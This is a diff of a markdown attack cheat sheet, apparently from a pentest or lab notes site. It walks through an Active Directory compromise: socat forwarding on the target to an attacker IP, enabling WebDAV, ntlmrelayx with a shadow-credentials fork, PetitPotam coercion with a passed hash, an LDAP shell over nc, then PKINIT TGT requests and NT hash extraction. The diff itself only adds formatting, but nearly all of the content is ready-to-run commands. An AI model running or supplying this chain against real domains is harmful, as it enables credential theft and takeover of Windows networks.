@@ -7,10 +7,10 @@ tags: ["ntlmreplay", "PetitPotam", "active driectory", "ad", "Windows", "adcs", 
 ---
 ### 1. Run socat to redirect traffic (In Windows Target)
 
-[socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)
+<div>
 
 ```powershell
-# Upload socat.zip
+# Upload socat.zip and unzip
 Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata')
 ```
 
@@ -18,7 +18,13 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.
 .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80
 ```
 
+</div>
+
+<small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>
+
 ### 2. Enable webdav (In Windows Target)
+
+<div>
 
 ```powershell
 $Source = @"
@@ -92,16 +98,24 @@ Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerP
 
 ```
 
+</div>
+
 <br>
+
+<div>
 
 ```powershell
 # Run enable_webdav.ps1
 C:\programdata\enable_webdav.ps1
 ```
 
+</div>
+
 ### 3. Start ntlmrelayx listener (In Local Linux)
 
 #### Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx's Interactive LDAP Shell
+
+<div>
 
 ```bash
 git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
@@ -131,21 +145,33 @@ pip install .
 pip3 install impacket pyOpenSSL==24.0.0
 ```
 
+</div>
+
 #### Run ntlmrelayx
+
+<div>
 
 ```bash
 proxychains4 examples/ntlmrelayx.py -t ldaps://<DC> --delegate-access -i
 ```
 
+</div>
+
 ### 4. Run PetitPotam (In Local Linux)
 
-[PetitPotam](https://github.com/topotam/PetitPotam)
+<div>
 
 ```bash
 proxychains4 python3 PetitPotam.py -u <USERNAME> -hashes :<HASH> <SOCAT_HOSTNAME>@8090/test <SOCAT_LISTENER_IP> -pipe all
 ```
 
+</div>
+
+<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>
+
 ### 5. Connect to LDAP shell (In Local Linux)
+
+<div>
 
 ```bash
 rlwrap nc 127.0.0.1 11000
@@ -160,18 +186,28 @@ clear_shadow_creds <SOCAT_HOSTNAME>$
 set_shadow_creds <SOCAT_HOSTNAME>$
 ```
 
+</div>
+
 ### 6. Request TGT using pfx file (In Local Linux)
 
-[PKINITtools](https://github.com/dirkjanm/PKINITtools)
+<div>
 
 ```bash
 proxychains4 python3 gettgtpkinit.py <DOMAIN>/<SOCAT_HOSTNAME>$ <SOCAT_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC>
 ```
 
+</div>
+
+<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>
+
 ### 7. Get NT Hash (In Local Linux)
+
+<div>
 
 ```bash
 proxychains4 python3 getnthash.py <DOMAIN>/<SOCAT_HOSTNAME>$ -key <AS-REP_encryption_key>
 ```
+
+</div>
 
 <br>
